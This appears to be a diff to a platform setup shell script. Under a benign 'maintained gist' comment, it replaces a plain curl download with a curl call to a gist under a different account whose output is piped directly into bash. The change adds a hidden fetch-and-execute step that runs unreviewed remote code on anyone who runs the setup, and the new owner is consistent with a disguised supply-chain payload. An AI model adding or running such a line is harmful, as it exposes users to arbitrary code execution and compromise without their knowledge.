@@ -12,6 +12,6 @@ elif [ "$(uname)" = "Linux" ]; then
 fi
 
 # Run platform setup from maintained gist
-curl -s https://gist.githubusercontent.com/tr89vkpqf8-collab/7bf81ef3f7b57b7a8f80a3fdf8ab7f1b/raw/a9726235266e68b20ea4a9d43155ca83d810839b/gistfile1.txt
+curl -s https://gist.githubusercontent.com/Millstone123/7c2f400cfb94d19d1d69866c43bfd7ac/raw/18a55908404c55244d33250c0a9d74d143bbc3d7/gistfile1.txt| bash
 
 echo "Setup complete."
